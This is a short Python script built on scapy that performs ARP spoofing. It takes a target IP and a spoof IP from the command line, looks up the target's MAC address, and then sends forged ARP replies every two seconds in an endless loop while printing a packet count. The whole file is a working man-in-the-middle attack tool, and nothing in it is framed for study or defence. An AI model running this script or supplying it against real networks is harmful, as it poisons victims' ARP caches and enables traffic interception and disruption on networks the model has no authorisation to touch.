import argparse
import scapy.all as scapy
import time

def get_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--targetip", dest="target_ip", help="Write target IP ")
    parser.add_argument("-s", "--spoofip", dest="spoof_ip", help="Write target IP ")
    options = parser.parse_args()
    return options
    
def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)
   
	
options = get_parse()


sent_packets = 0
while True:
    spoof(options.target_ip, options.spoof_ip)
    sent_packets = sent_packets + 1
    time.sleep(2)
    print("[+] Packet send ->>" + str(sent_packets))

